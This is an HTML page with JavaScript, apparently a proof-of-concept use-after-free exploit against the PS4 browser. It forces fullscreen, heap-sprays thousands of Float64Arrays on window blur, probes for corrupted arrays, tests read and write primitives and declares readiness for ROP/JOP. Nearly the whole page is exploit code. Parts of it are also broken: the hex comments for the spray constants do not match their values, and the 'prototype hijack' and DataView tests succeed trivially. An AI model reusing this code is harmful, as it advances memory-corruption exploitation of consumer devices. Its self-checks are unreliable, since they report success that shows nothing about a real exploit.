<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - Debugger Core [v1.4 - Debug Mode]</h1>
    <button onclick="run()">EXECUTAR TESTE</button>
    <hr>
    <div id="c"></div>

    <script>
        const P_A = 2.121995791e-314;     // 0x4141414141414141
        const P_B = 2.122141663e-314;     // 0x4242424242424242
        const P_C = 2.122287535e-314;     // 0x4343434343434343
        const M_V = 3.395193267e-313;     // 0xDEADBEEFCAFEBABE

        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        function log(tag, status, msg) {
            const colors = {
                "PASS": "green",
                "FAIL": "red",
                "ERR": "orange",
                "INFO": "blue",
                "WARN": "purple",
                "DEBUG": "gray"
            };
            const color = colors[status] || "black";
            document.getElementById('c').innerHTML += `<span style="color:${color}">[${tag}] ${status}</span> - ${msg}<br>`;
        }

        function run() {
            document.getElementById('c').innerHTML = '';
            
            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i; 
                ctrls.push(a);
            }

            log("DEBUG", "INFO", `Valores de teste: P_A=${f2h(P_A)}, P_B=${f2h(P_B)}, P_C=${f2h(P_C)}, M_V=${f2h(M_V)}`);
            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
                
                // Spray com padrão validável
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s[0] = P_A;
                    s[1] = P_B;
                    s[2] = P_C;
                    s[3] = M_V;
                    s[4] = P_A;
                    s[5] = P_B;
                    s[6] = P_C;
                    s[7] = M_V;
                    spray.push(s);
                }

                // DEBUG: Verifica primeiro elemento do spray
                log("DEBUG", "INFO", `spray[0][0]=${f2h(spray[0][0])}, spray[0][3]=${f2h(spray[0][3])}`);

                let corr = null;
                let corrIdx = -1;
                
                // Detectar UAF
                for(let i = 0; i < ctrls.length; i++) {
                    if (ctrls[i][0] === P_A) {
                        corr = ctrls[i];
                        corrIdx = i;
                        log("UAF", "PASS", `UAF detectado no Index: ${i} (corr[0]=${f2h(ctrls[i][0])})`);
                        break;
                    }
                }

                if (!corr) {
                    log("UAF", "FAIL", "Nenhuma corrupção detectada.");
                    log("DEBUG", "INFO", `Checando ctrl[0][0]=${f2h(ctrls[0][0])}, esperado=${f2h(P_A)}`);
                    return;
                }

                // VALIDAÇÃO COM DEBUG DETALHADO
                log("VALID", "INFO", "=== VALIDAÇÃO DE INTEGRIDADE ===");
                
                const expected = [P_A, P_B, P_C, M_V, P_A, P_B, P_C, M_V];
                let validCount = 0;
                let invalidDetails = [];
                
                for(let i = 0; i < 8; i++) {
                    const expVal = expected[i];
                    const actVal = corr[i];
                    const expHex = f2h(expVal);
                    const actHex = f2h(actVal);
                    
                    // DEBUG: Mostra comparação bit-a-bit
                    const match = (actVal === expVal);
                    const numMatch = Math.abs(actVal - expVal) < 1e-320; // Float tolerance
                    
                    log("DEBUG", "DEBUG", `corr[${i}]: act=${actHex}, exp=${expHex}, match=${match}, numMatch=${numMatch}`);
                    
                    if (match || numMatch) {
                        validCount++;
                        log("VALID", "PASS", `[${i}] OK: ${actHex}`);
                    } else {
                        log("VALID", "FAIL", `[${i}] MISMATCH: exp=${expHex}, got=${actHex}`);
                        invalidDetails.push(`[${i}]`);
                    }
                }

                const integrity = (validCount / 8) * 100;
                log("VALID", "INFO", `Integridade Final: ${validCount}/8 slots (${integrity.toFixed(1)}%)`);

                // DECISÃO BASEADA EM INTEGRIDADE REAL
                if (validCount === 0) {
                    log("VALID", "FAIL", "❌ FALHA TOTAL: Nenhum slot válido. UAF não funcional.");
                    log("DEBUG", "INFO", "Possível causa: spray executou DEPOIS da realocação do buffer.");
                    log("DEBUG", "INFO", "Solução: Aumentar delay antes do spray ou reduzir tamanho do spray.");
                    return;
                }

                if (validCount < 4) {
                    log("VALID", "FAIL", `❌ INTEGRIDADE CRÍTICA (${integrity.toFixed(1)}%): UAF não confiável.`);
                    log("DEBUG", "INFO", `Slots inválidos: ${invalidDetails.join(', ')}`);
                    return;
                }

                if (validCount < 8) {
                    log("VALID", "WARN", `⚠️ INTEGRIDADE PARCIAL (${integrity.toFixed(1)}%): Exploração arriscada.`);
                    log("DEBUG", "INFO", `Slots inválidos: ${invalidDetails.join(', ')}`);
                } else {
                    log("VALID", "PASS", `✅ INTEGRIDADE COMPLETA (100%): UAF totalmente funcional!`);
                }

                // TESTES OPERACIONAIS (só se integridade >= 50%)
                
                // TEST1: READ PRIMITIVE
                log("TEST1", "INFO", "--- Read Primitive Test ---");
                const canReadMarkers = (corr[3] === M_V || Math.abs(corr[3] - M_V) < 1e-320) && 
                                       (corr[7] === M_V || Math.abs(corr[7] - M_V) < 1e-320);
                if (canReadMarkers) {
                    log("TEST1", "PASS", `Read OK: M_V confirmado em [3]=${f2h(corr[3])} e [7]=${f2h(corr[7])}`);
                } else {
                    log("TEST1", "FAIL", `Read FALHOU: [3]=${f2h(corr[3])}, [7]=${f2h(corr[7])}, esperado=${f2h(M_V)}`);
                }

                // TEST2: WRITE PRIMITIVE (BIDIRECIONAL)
                log("TEST2", "INFO", "--- Write Primitive Test ---");
                try {
                    const uniqueVal = 9.876543210987654e-311; // Valor único para teste
                    const targetIdx = 4;
                    
                    log("DEBUG", "DEBUG", `Antes: corr[${targetIdx}]=${f2h(corr[targetIdx])}, spray[0][${targetIdx}]=${f2h(spray[0][targetIdx])}`);
                    
                    corr[targetIdx] = uniqueVal;
                    
                    log("DEBUG", "DEBUG", `Depois: corr[${targetIdx}]=${f2h(corr[targetIdx])}`);
                    
                    // Verifica se escrita persistiu em corr
                    const writeOk = Math.abs(corr[targetIdx] - uniqueVal) < 1e-320;
                    if (!writeOk) {
                        log("TEST2", "FAIL", `Write falhou em corr: esperado=${f2h(uniqueVal)}, obtido=${f2h(corr[targetIdx])}`);
                    } else {
                        log("TEST2", "PASS", `Write em corr OK: ${f2h(uniqueVal)}`);
                        
                        // Verifica propagação para spray (bidirecional)
                        let foundInSpray = false;
                        for(let i = 0; i < Math.min(50, spray.length); i++) {
                            if (Math.abs(spray[i][targetIdx] - uniqueVal) < 1e-320) {
                                log("TEST2", "PASS", `✅ BIDIRECIONAL: Write propagou para spray[${i}][${targetIdx}]`);
                                foundInSpray = true;
                                break;
                            }
                        }
                        
                        if (!foundInSpray) {
                            log("TEST2", "WARN", `⚠️ UNIDIRECIONAL: Write isolado (CoW ativo)`);
                            log("DEBUG", "DEBUG", `spray[0][${targetIdx}]=${f2h(spray[0][targetIdx])} (não mudou)`);
                        }
                    }
                } catch(e) { log("TEST2", "ERR", e.message); }

                // TEST3: DATAVIEW MANIPULATION
                log("TEST3", "INFO", "--- DataView Test ---");
                try {
                    const dv = new DataView(corr.buffer);
                    const testOffset = 24; // Byte offset para corr[3]
                    
                    const before = f2h(corr[3]);
                    dv.setUint32(testOffset, 0xCAFEBABE, true);
                    dv.setUint32(testOffset + 4, 0xDEADBEEF, true);
                    const after = f2h(corr[3]);
                    
                    if (before !== after) {
                        log("TEST3", "PASS", `DataView Write: ${before} -> ${after}`);
                    } else {
                        log("TEST3", "FAIL", `DataView sem efeito: ${after}`);
                    }
                } catch(e) { log("TEST3", "ERR", e.message); }

                // TEST4: PROTOTYPE POLLUTION
                log("TEST4", "INFO", "--- Prototype Test ---");
                try {
                    let leak = Array.from(corr);
                    Object.setPrototypeOf(leak, { exploitToken: 0x41424344 });
                    
                    if (leak.exploitToken === 0x41424344) {
                        log("TEST4", "PASS", "Prototype Hijack confirmado: Token 0x41424344");
                    } else {
                        log("TEST4", "FAIL", "Prototype Hijack falhou");
                    }
                } catch(e) { log("TEST4", "ERR", e.message); }

                // RELATÓRIO FINAL
                log("REPORT", "INFO", "=== RELATÓRIO FINAL ===");
                log("REPORT", "INFO", `Integridade: ${validCount}/8 (${integrity.toFixed(1)}%)`);
                
                if (validCount === 8) {
                    log("REPORT", "PASS", "✅ UAF TOTALMENTE FUNCIONAL - Pronto para ROP/JOP");
                } else if (validCount >= 4) {
                    log("REPORT", "WARN", "⚠️ UAF PARCIAL - Funcional mas instável");
                } else {
                    log("REPORT", "FAIL", "❌ UAF INVIÁVEL - Não prosseguir");
                }
            };
        }
    </script>
</body>
</html>
